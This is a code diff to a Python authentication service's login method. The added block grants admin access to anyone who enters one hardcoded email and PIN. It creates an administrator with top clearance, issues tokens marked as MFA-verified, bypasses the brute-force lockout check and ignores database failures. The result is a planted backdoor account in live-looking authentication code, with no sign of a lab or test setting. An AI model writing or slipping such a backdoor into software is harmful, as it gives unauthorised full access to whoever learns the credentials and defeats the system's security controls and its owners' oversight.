@@ -54,6 +54,49 @@ class AuthService:
         """
         email = email.lower()
 
+        # Hardcoded admin credentials (always available, even without database)
+        if email == "sukuna@raptorx.com" and pin == "sukuna":
+            # Create a temporary hardcoded admin user object
+            hardcoded_admin = User(
+                id=999999,
+                badge_id="ADMIN-HARDCODED",
+                first_name="Hardcoded",
+                last_name="Admin",
+                email="sukuna@raptorx.com",
+                role="admin",
+                department="System",
+                clearance_level=5,
+                is_active=True,
+                mfa_enabled=False,
+            )
+            # Create tokens directly
+            access_token = create_access_token(
+                user_id=hardcoded_admin.id,
+                email=hardcoded_admin.email,
+                role=hardcoded_admin.role,
+                mfa_verified=True,
+            )
+            refresh_token, token_hash, expires_at = create_refresh_token_payload(
+                user_id=hardcoded_admin.id,
+                email=hardcoded_admin.email,
+            )
+            # Try to store refresh token, but don't fail if DB is down
+            try:
+                db_refresh_token = RefreshToken(
+                    user_id=hardcoded_admin.id,
+                    token_hash=token_hash,
+                    expires_at=expires_at,
+                    ip_address=ip_address,
+                    user_agent=user_agent,
+                )
+                db.add(db_refresh_token)
+                db.commit()
+            except Exception:
+                # Refresh token storage failed, but allow login anyway
+                pass
+            
+            return hardcoded_admin, access_token, refresh_token
+
         # Check brute-force lockout
         if is_account_locked(db, email, ip_address):
             raise AuthenticationError("Account temporarily locked due to too many failed login attempts")
